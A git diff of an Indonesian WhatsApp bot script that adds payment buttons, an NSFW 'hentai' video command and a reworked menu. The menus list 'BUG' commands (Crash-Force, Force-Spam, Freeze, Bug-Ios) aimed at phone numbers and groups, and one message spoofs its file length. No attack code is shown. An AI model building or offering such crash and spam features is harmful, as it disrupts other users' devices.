+                    ...(await prepareWAMessageMedia({ image: { url: './lib/media/image/ovo.jpg' } }, { upload: Xlesy.waUploadToServer })),
+                    title: '',
+                    gifPlayback: true,
+                    subtitle: author,
+                    hasMediaAttachment: false
+                  }),
+                  body: { text: `> Klik tombol OVO di bawah\n> OVO A/N: ${ovo}` },
+                  nativeFlowMessage: {
+                    buttons: [
+                      {
+                        "name": "cta_copy",
+                        "buttonParamsJson": `{\"display_text\":\"Payment OVO\",\"id\":\"123456789\",\"copy_code\":\"${gopay}\"}`
+                      },
+                    ],
+                  },
+                },
+                {
+                header: proto.Message.InteractiveMessage.Header.create({
+                    ...(await prepareWAMessageMedia({ image: { url: './lib/media/image/pulsa.jpg' } }, { upload: Xlesy.waUploadToServer })),
+                    title: '',
+                    gifPlayback: true,
+                    subtitle: author,
+                    hasMediaAttachment: false
+                  }),
+                  body: { text: `> Klik tombol PULSA di bawah\n> PULSA A/N: ${pulsa}` },
+                  nativeFlowMessage: {
+                    buttons: [
+                      {
+                        "name": "cta_copy",
+                        "buttonParamsJson": `{\"display_text\":\"Payment PULSA\",\"id\":\"123456789\",\"copy_code\":\"${gopay}\"}`
+                      },
+                    ],
+                  },
+                },
+                {
+                  header: proto.Message.InteractiveMessage.Header.create({
+                    ...(await prepareWAMessageMedia({ image: { url: './lib/media/image/qris.jpg' } }, { upload: Xlesy.waUploadToServer })),
+                    title: '',
+                    gifPlayback: true,
+                    subtitle: author,
+                    hasMediaAttachment: false
+                  }),
+                  body: { text: `> SCAN di atas / klik tombol` },
+                  nativeFlowMessage: {
+                    buttons: [
+                      {
+                        "name": "cta_copy",
+                        "buttonParamsJson": `{\"display_text\":\"Payment PULSA\",\"id\":\"123456789\",\"copy_code\":\"${qris}\"}`
+                      },
+                    ],
+                  },
+                },
+              ],
+              messageVersion: 1,
+            },
+          },
+        },
+      },
+    },
+    { quoted: fkontak1 }
+  );
 
-                let buttons = [{
-                    buttonId: ".owner",
-                    buttonText: {
-                        displayText: "👤Owner"
-                    },
-                    type: 1
-                }]
-
-                // Kirim gambar lokal + teks + tombol
-                await Xlesy.sendButtonMsg(m.chat, {
-                    image: {
-                        url: imagePath
-                    }, // Menggunakan file lokal
-                    text: textMessage,
-                    footer: 'XlesyGxyenn',
-                    buttons: buttons
-                }, {
-                    quoted: ftroli
-                })
-                await Xlesy.sendMessage(m.chat, {
-                    react: {
-                        text: '✅',
-                        key: m.key
-                    }
-                })
-            }
-            break
-            //menu push 
-            case "setteksjpm": {
-                if (!isOwner) return m.reply(msg.owner)
-                if (text || m.quoted) {
-                    const newteks = m.quoted ? m.quoted.text : text
-                    await fs.writeFileSync("./database/teksjpm.js", newteks.toString())
-                    m.reply("Berhasil Mengganti Teks JPM ✅", {
-                        quoted: fkontak1
-                    })
-                } else {
-                    return m.reply(example("Gunakan reply/kirim teks\n\nUntuk melihat teks JPM saat ini, ketik *.teksjpm*"), {
-                        quoted: fkontak1
-                    })
-                }
-            }
-            break
-
+  await Xlesy.relayMessage(msg.key.remoteJid, msg.message, {
+    messageId: msg.key.id,
+  });
+}
+break;
             case "teksjpm": {
                 if (!isOwner) return m.reply(msg.owner)
                 m.reply(fs.readFileSync("./database/teksjpm.js").toString())
@@ -6877,6 +8768,31 @@ _Dengan dukungan teknologi modern dan optimasi berkelanjutan, SC Xlesy tidak han
                 }
             }
             break
+case 'hentai': {
+    try {
+        let apiKey = 'APIKEY_KAMU'; // Ganti dengan API Key kamu
+        let res = await fetchJson(`https://api.agatz.xyz/api/hentaivid?apikey=${apiKey}`);
+
+        // Cek apakah respons valid
+        if (!res || !res.data || res.data.length === 0) {
+            return m.reply('Gagal mengambil video, coba lagi nanti.');
+        }
+
+        // Ambil URL video pertama
+        let videoUrl = res.data[0].video_1 || res.data[0].video_2;
+
+        if (!videoUrl) {
+            return m.reply('Tidak ada video yang tersedia.');
+        }
+
+        await Xlesy.sendMessage(m.chat, { video: { url: videoUrl }, caption: 'Here is your hentai video 🍑' }, { quoted: fkontak1 });
+
+    } catch (e) {
+        console.error(e);
+        m.reply('Server sedang offline!', { quoted: fkontak1 });
+    }
+}
+break;
             case 'neko': {
                 try {
                     if (text == 'nsfw') {
@@ -7542,13 +9458,14 @@ _Dengan dukungan teknologi modern dan optimasi berkelanjutan, SC Xlesy tidak han
                         key: m.key
                     }
                 })
+                
                 let profile
-                try {
-                    profile = await Xlesy.profilePictureUrl(m.sender, 'image');
-                } catch (e) {
-                    profile = fake.anonim
-                }
-                const menunya = `
+				try {
+					profile = await Xlesy.profilePictureUrl(m.sender, 'image');
+				} catch (e) {
+					profile = fake.anonim
+				}	 
+                let menunya = `
   ❍───❍「 \`ALLMENU\`📚 」❍───❍
 				
 ╭──────┈➤「 *\`BOT\`* 」❍
@@ -7884,16 +9801,9 @@ _Dengan dukungan teknologi modern dan optimasi berkelanjutan, SC Xlesy tidak han
 │ ${setv} ${prefix}mobil  
 │ ${setv} ${prefix}cina  
 │ ${setv} ${prefix}vietnam  
-╰─┬────┈➤
-╭─┴─┈➤「 *\`BUG\`* 」❍    
-│ ${setv} ${prefix}Crash-Force (628XXX)
-│ ${setv} ${prefix}Force-Ui (628XXX)
-│ ${setv} ${prefix}Force-Spam (628XXX) 
-│ ${setv} ${prefix}Bugs-Force (628XXX)
-│ ${setv} ${prefix}Freeze (linkgc/idgc)
-│ ${setv} ${prefix}Bug-Ios (628XXX)
-╰─┬────┈➤
-╭─┴─┈➤「 *\`OWNER\`* 」❍
+╰ ─┬────┈➤
+ ─┬┴─┈➤「 XlesyBug 」❍    
+╭ ┴─┈➤「 *\`OWNER\`* 」❍
 │ ${setv} ${prefix}bot [set]
 │ ${setv} ${prefix}done
 │ ${setv} ${prefix}setbio
@@ -7929,7 +9839,7 @@ _Dengan dukungan teknologi modern dan optimasi berkelanjutan, SC Xlesy tidak han
 					fileName: ucapanWaktu,
 					mimetype: pickRandom(fake.listfakedocs),
 					fileLength: '100000000000000',
-					pageCount: '999',
+					pageCount: '17-12-10',
 					caption: menunya,
 					contextInfo: {
 						mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
@@ -7944,10 +9854,10 @@ _Dengan dukungan teknologi modern dan optimasi berkelanjutan, SC Xlesy tidak han
 							title: author,
 							body: packname,
 							showAdAttribution: true,
-							thumbnailUrl: profile,
+							thumbnailUrl: profile,                                            						
 							mediaType: 1,
 							previewType: 0,
-							renderLargerThumbnail: true,
+							renderLargerThumbnail: false,
 							mediaUrl: my.gh,
 							sourceUrl: my.gh,
 						}}}, { quoted: ftroli })
@@ -8023,6 +9933,9 @@ _Dengan dukungan teknologi modern dan optimasi berkelanjutan, SC Xlesy tidak han
             break
 
             case 'groupmenu': {
+            if (!m.isGroup) return m.reply('Fitur ini hanya dapat digunakan di grup.', {
+                    quoted: fkontak1
+                })
                 await Xlesy.sendMessage(m.chat, {
                     react: {
                         text: '⏳',
@@ -8765,52 +10678,6 @@ _Dengan dukungan teknologi modern dan optimasi berkelanjutan, SC Xlesy tidak han
                 })
             }
             break
-            case 'bugmenu': {
-                await Xlesy.sendMessage(m.chat, {
-                    react: {
-                        text: '⏳',
-                        key: m.key
-                    }
-                })
-                let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal
-
-                let textMessage = `❍───❍「 _*Xlesy Menuya*_ 」❍───❍  
-╭──┈➤「 *BUG* 」❍    
-│ ${setv} ${prefix}Crash-Force (628xxxx)
-│ ${setv} ${prefix}Force-Ui (628xxxx)
-│ ${setv} ${prefix}Force-Spam (628xxxx) 
-│ ${setv} ${prefix}Bugs-Force (628xxxx) 
-│ ${setv} ${prefix}Freeze (linkgc/idgc)
-│ ${setv} ${prefix}Bug-Ios (628xxxx)
-╰─────┈➤  
-`
-                let buttons = [{
-                    buttonId: ".menu",
-                    buttonText: {
-                        displayText: "Back To Menu"
-                    },
-                    type: 1
-                }]
-
-                // Kirim gambar lokal + teks + tombol
-                await Xlesy.sendButtonMsg(m.chat, {
-                    image: {
-                        url: imagePath
-                    }, // Menggunakan file lokal
-                    text: textMessage,
-                    footer: 'XLESYVIP',
-                    buttons: buttons
-                }, {
-                    quoted: ftroli
-                })
-                await Xlesy.sendMessage(m.chat, {
-                    react: {
-                        text: '✅',
-                        key: m.key
-                    }
-                })
-            }
-            break
             case 'ownermenu': {
                 await Xlesy.sendMessage(m.chat, {
                     react: {
@@ -8880,24 +10747,23 @@ _Dengan dukungan teknologi modern dan optimasi berkelanjutan, SC Xlesy tidak han
             }
             break
 
-            case 'menu': {
-                await Xlesy.sendMessage(m.chat, {
-                    react: {
-                        text: '⏳',
-                        key: m.key
-                    }
-                })
-                let imagePath = './lib/media/image/menu1.jpg' // Gantilah dengan lokasi file yang benar
-                let audioPath = './lib/media/audio/menu.opus' // Gantilah dengan lokasi file yang benar
-                const media = await prepareWAMessageMedia({
-                    image: {
-                        url: imagePath
-                    }
-                }, {
-                    upload: Xlesy.waUploadToServer
-                });
+case 'menu': {
+    await Xlesy.sendMessage(m.chat, {
+        react: {
+            text: '⏳',
+            key: m.key
+        }
+    });
 
-                let menunya = `Hey *${m.pushName ? m.pushName : 'Unknown'}!* ${ucapanWaktu}
+    let imagePath = './lib/media/image/menu1.jpg'; // Path ke video lokal
+    let audioPath = './lib/media/audio/menu.opus'; // Path ke audio
+    const media = await prepareWAMessageMedia({
+        image: { url: imagePath }
+    }, {
+        upload: Xlesy.waUploadToServer
+    });
+
+    let menunya = `Hey *${m.pushName ? m.pushName : 'Unknown'}!* ${ucapanWaktu}
 Selamat Datang di *\`XlesyVIP\`* A bot Assistant That Is Ready To Help With Anything On The Menu.
 
 ╭──┈➤ *\`INFO USER\`*
@@ -8924,204 +10790,136 @@ Selamat Datang di *\`XlesyVIP\`* A bot Assistant That Is Ready To Help With Anyt
 
 々 Click \`XlesyMenu\` Below 々`;
 
-                const buttons = {
-                    buttonsMessage: {
-                        contentText: menunya,
-                        footerText: `© Gxyenn   -> XlesyBot`,
-                        buttons: [{
-                                buttonId: ".owner",
-                                buttonText: {
-                                    displayText: "👤 Owner"
+    const buttons = {
+        buttonsMessage: {
+            contentText: menunya,
+            footerText: `© Gxyenn   -> XlesyBot`,
+            buttons: [
+                {
+                    buttonId: ".owner",
+                    buttonText: { displayText: "👤 Owner" },
+                    type: 1,
+                },
+                {
+                    buttonId: ".sewa",
+                    buttonText: { displayText: "🛍️ Sewa" },
+                    type: 1,
+                },
+                {
+                    buttonId: ".example3",
+                    buttonText: { displayText: "📜 List Menu" },
+                    type: 2, // Type 2 untuk list menu
+                    nativeFlowInfo: {
+                        name: "single_select",
+                        paramsJson: JSON.stringify({
+                            title: "XlesyMenu",
+                            sections: [
+                                {
+                                    title: "List Menu Yang Sering Dipakai",
+                                    highlight_label: "Populer",
+                                    rows: [
+                                        {
+                                            id: ".allmenu",
+                                            title: "📚 All Menu",
+                                            description: "Menampilkan Semua Menu"
+                                        }
+                                    ]
                                 },
-                                type: 1,
-                            },
-                            {
-                                buttonId: ".sewa",
-                                buttonText: {
-                                    displayText: "🛍️ Sewa"
+                                {
+                                    title: "List Menu Yang Terpisah",
+                                    rows: [
+                                        { id: ".botmenu", title: "🧾 Bot Menu", description: "Menampilkan Menu Bot" },
+                                        { id: ".groupmenu", title: "👥 Group Menu", description: "Menampilkan Menu Group" },
+                                        { id: ".searchmenu", title: "🔍 Search Menu", description: "Menampilkan Menu Pencarian" },
+                                        { id: ".downloadmenu", title: "📥 Download Menu", description: "Menampilkan Menu Download" },
+                                        { id: ".pushmenu", title: "🚀 Push Menu", description: "Menampilkan Menu Push" },
+                                        { id: ".quotesmenu", title: "🔖 Quotes Menu", description: "Menampilkan Menu Quotes" },
+                                        { id: ".librarymenu", title: "📖 Library Menu", description: "Menampilkan Menu Library" },
+                                        { id: ".toolsmenu", title: "🛠️ Tools Menu", description: "Menampilkan Menu Alat" },
+                                        { id: ".aimenu", title: "🧠 AI Menu", description: "Menampilkan Menu AI" },
+                                        { id: ".gamemenu", title: "🎮 Game Menu", description: "Menampilkan Menu Game" },
+                                        { id: ".funmenu", title: "🎉 Fun Menu", description: "Menampilkan Menu Hiburan" },
+                                        { id: ".animemenu", title: "📺 Anime Menu", description: "Menampilkan Menu Anime" },
+                                        { id: ".musicmenu", title: "🎧 Music Menu", description: "Menampilkan Menu Audio" },
+                                        { id: ".randommenu", title: "🌟 Random Menu", description: "Menampilkan Menu Acak" },
+                                        { id: ".ownermenu", title: "👑 Owner Menu", description: "Menampilkan Menu Owner" }
+                                    ]
                                 },
-                                type: 1,
-                            },
-                            {
-                                buttonId: ".example3",
-                                buttonText: {
-                                    displayText: "📜 List Menu"
+                                {
+                                    title: "List Menu Bug XlesyVIP",
+                                    highlight_label: "Tahap Pengembangan",
+                                    rows: [
+                                        {
+                                            id: ".xlesybug",
+                                            title: "⚡ BUG XLESYVIP",
+                                            description: "Menampilkan Menu BUG XlesyVIP"
+                                        }
+                                    ]
                                 },
-                                type: 2, // Type 2 untuk list menu
-                                nativeFlowInfo: {
-                                    name: "single_select",
-                                    paramsJson: JSON.stringify({
-                                        title: "XlesyMenu",
-                                        sections: [{
-                                                title: "List Menu Yang Sering Dipakai",
-                                                highlight_label: "Populer",
-                                                rows: [{
-                                                    id: ".allmenu",
-                                                    title: "📚 All Menu",
-                                                    description: "Menampilkan Semua Menu"
-                                                }]
-                                            },
-                                            {
-                                                title: "List Menu Yang Terpisah",
-                                                rows: [{
-                                                        id: ".botmenu",
-                                                        title: "🧿 Bot Menu",
-                                                        description: "Menampilkan Menu Bot"
-                                                    },
-                                                    {
-                                                        id: ".groupmenu",
-                                                        title: "💬 Group Menu",
-                                                        description: "Menampilkan Menu Group"
-                                                    },
-                                                    {
-                                                        id: ".searchmenu",
-                                                        title: "🔍 Search Menu",
-                                                        description: "Menampilkan Menu Pencarian"
-                                                    },
-                                                    {
-                                                        id: ". downloadmenu",
-                                                        title: "📥 Download Menu",
-                                                        description: "Menampilkan Menu Download"
-                                                    },
-                                                    {
-                                                        id: ".pushmenu",
-                                                        title: "🚀 Push Menu ",
-                                                        description: "Menpalikn Menu Push"
-                                                    },
-                                                    {
-                                                        id: ".quotesmenu",
-                                                        title: "📝 Quotes Menu",
-                                                        description: "Menampilkan Menu Quotes"
-                                                    },
-                                                    {
-                                                        id: ".libraymenu",
-                                                        title: "📖 Libray Menu",
-                                                        description: "Menampilkan Menu Libray"
-                                                    },
-                                                    {
-                                                        id: ".toolsmenu",
-                                                        title: "🛠️ Tools Menu",
-                                                        description: "Menampilkan Menu Alat"
-                                                    },
-                                                    {
-                                                        id: ".aimenu",
-                                                        title: "🧠 Ai Menu",
-                                                        description: "Menampilkan Menu Al"
-                                                    },
-                                                    {
-                                                        id: ".gamemenu",
-                                                        title: "🎮 Game Menu",
-                                                        description: "Menampilkan Menu Game"
-                                                    },
-                                                    {
-                                                        id: ".funmenu",
-                                                        title: "🎉 Fun Menu",
-                                                        description: "Menampilkan Menu Hiburan"
-                                                    },
-                                                    {
-                                                        id: ".animemenu",
-                                                        title: "📺 Anime Menu",
-                                                        description: "Menampilkan Menu Anime"
-                                                    },
-                                                    {
-                                                        id: ".musicmenu",
-                                                        title: "🎧 Music Menu",
-                                                        description: "Menampilkan Menu Audio"
-                                                    },
-                                                    {
-                                                        id: ".randommenu",
-                                                        title: "🌟 Random Menu",
-                                                        description: "Menampilkan Menu Acak"
-                                                    },
-                                                    {
-                                                        id: ".ownermenu",
-                                                        title: "👑 Owner Menu",
-                                                        description: "Menampilkan Menu Owner"
-                                                    }
-                                                ]
-                                            },
-                                            {
-                                                title: "List Menu Bug XlesyVIP",
-                                                highlight_label: "Pengembangan",
-                                                rows: [{
-                                                    id: ".bugmenu",
-                                                    title: "🦖 BUG XlesyVIP",
-                                                    description: "Menampilkan Menu BUG XlesyVip"
-                                                }]
-                                            },
-                                            {
-                                                title: "Documentasi Bot",
-                                                rows: [{
-                                                        id: ".script",
-                                                        title: "📁 Script",
-                                                        description: "Menampilkan Information Script"
-                                                    },
-                                                    {
-                                                        id: ".infobot",
-                                                        title: "🗒️ Information Bot",
-                                                        description: "Menampilkan Information Bot"
-                                                    }
-                                                ]
-                                            }
-                                        ]
-                                    })
+                                {
+                                    title: "Documentasi Bot",
+                                    rows: [
+                                        { id: ".script", title: "📁 Script", description: "Menampilkan Information Script" },
+                                        { id: ".infobot", title: "🗒️ Information Bot", description: "Menampilkan Information Bot" }
+                                    ]
                                 }
+                            ]
+                        })
+                    }
+                }
+            ],
+            headerType: 4,
+            imageMessage: media.imageMessage,
+            mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
+        },
+    };
+
+    const generatedMessage = await generateWAMessageFromContent(
+        m.chat,
+        buttons,
+        {
+            userJid: m.sender,
+            quoted: ftroli, // Gunakan sebagai quote
+        }
+    );
+
+    await Xlesy.relayMessage(m.chat, generatedMessage.message, {
+        additionalNodes: [
+            {
+                tag: "biz",
+                attrs: {},
+                content: [
+                    {
+                        tag: "interactive",
+                        attrs: { type: "native_flow", v: "1" },
+                        content: [
+                            {
+                                tag: "native_flow",
+                                attrs: { name: "quick_reply" }
                             }
                         ],
-                        headerType: 4,
-                        imageMessage: media.imageMessage,
-                        mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
-                    },
-                };
-
-                const generatedMessage = await generateWAMessageFromContent(
-                    m.chat,
-                    buttons, {
-                        userJid: m.sender,
-                        quoted: ftroli, // Gunakan  sebagai quote
                     }
-                );
-
-                await Xlesy.relayMessage(m.chat, generatedMessage.message, {
-                    additionalNodes: [{
-                        tag: "biz",
-                        attrs: {},
-                        content: [{
-                            tag: "interactive",
-                            attrs: {
-                                type: "native_flow",
-                                v: "1"
-                            },
-                            content: [{
-                                tag: "native_flow",
-                                attrs: {
-                                    name: "quick_reply"
-                                }
-                            }, ],
-                        }, ],
-                    }, ],
-                });
-
-                setTimeout(async () => {
-                    await Xlesy.sendMessage(m.chat, {
-                        audio: {
-                            url: audioPath
-                        },
-                        mimetype: 'audio/mpeg',
-                        ptt: true
-                    }, {
-                        quoted: fkontak1
-                    })
-                }, 1000); // Delay 3 detik agar video/foto dikirim lebih dulu
-                await Xlesy.sendMessage(m.chat, {
-                    react: {
-                        text: '✅',
-                        key: m.key
-                    }
-                })
+                ],
             }
-            break;
+        ],
+    });
 
+    setTimeout(async () => {
+        await Xlesy.sendMessage(m.chat, {
+            audio: { url: audioPath },
+            mimetype: 'audio/mpeg',
+            ptt: true
+        }, { quoted: fkontak1 });
+    }, 1000); // Delay 1 detik agar video/foto dikirim lebih dulu
+
+    await Xlesy.sendMessage(m.chat, {
+        react: {
+            text: '✅',
+            key: m.key
+        }
+    });
+}
+break;
             default:
                 if (budy.startsWith('>')) {
                     if (!isCreator) return
@@ -9154,8 +10952,7 @@ Selamat Datang di *\`XlesyVIP\`* A bot Assistant That Is Ready To Help With Anyt
         }
     } catch (err) {
         console.log(err);
-        // m.reply('*❗ Internal server error️*');		
-        const nomorLaporan = '6283877636168';
+        // m.reply('*❗ Internal server error️*');		        
         Xlesy.sendFromOwner(nomorLaporan, `Halo Devolper, sepertinya ada yang error nih, jangan lupa diperbaiki ya\n\nVersion : *${require('./package.json').version}*\n\n*Log error:*\n\n` + util.format(err), m, {
             contextInfo: {
                 isForwarded: true
